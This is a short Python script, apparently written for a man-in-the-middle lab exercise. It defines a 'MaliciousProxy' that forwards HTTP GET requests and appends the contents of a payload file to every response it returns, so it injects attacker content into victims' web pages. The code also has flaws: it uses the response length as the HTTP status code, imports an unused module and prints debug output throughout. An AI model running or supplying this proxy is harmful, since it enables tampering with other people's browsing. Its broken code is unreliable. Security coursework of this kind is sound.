import http.server
import urllib.request
import socketserver
import sys

from aiohttp import Payload

if len(sys.argv) < 3:
    print('Usage: python3 mitm.py <port> <payload file>')
    exit(1)
class MaliciousProxy(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print('[*] Got request for: {}'.format(self.path))
        # Your code will go here
        req = urllib.request.Request(self.path)
        print(req)
        print(self.path)
        response = urllib.request.urlopen(req)
        print(response)
        response = response.read().decode('utf-8')
        print(response)
        print(sys.argv[2])
        payload = open(sys.argv[2], "r")
    
        response += payload.read()
        print(response)

        response = response.encode('utf-8')
        self.send_response(len(response))
        self.end_headers()
        self.wfile.write(response)




port = int(sys.argv[1])
server = socketserver.ThreadingTCPServer(('', port), MaliciousProxy)
print("[*] Serving on port {}".format(port))
server.serve_forever()